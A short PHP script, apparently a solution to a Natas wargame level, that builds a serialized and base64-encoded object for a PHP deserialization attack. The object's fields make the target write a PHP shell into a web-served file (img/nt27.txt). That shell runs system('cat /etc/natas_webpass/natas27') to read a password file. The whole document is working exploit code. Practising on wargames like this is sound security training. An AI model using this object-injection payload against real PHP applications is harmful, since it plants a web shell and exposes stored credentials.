<?php
	class Test {
		private $logFile;
		private $initMsg;
		private $exitMsg;
		
		function __construct($file) {
			$this->initMsg="Hi\n";
			$this->exitMsg="<? system('cat /etc/natas_webpass/natas27'); ?>\n\n";
			$this->logFile="img/nt27.txt";
		}
	}
	$object = new Test("Some text");
	print base64_encode(serialize($object))."\n";
?>
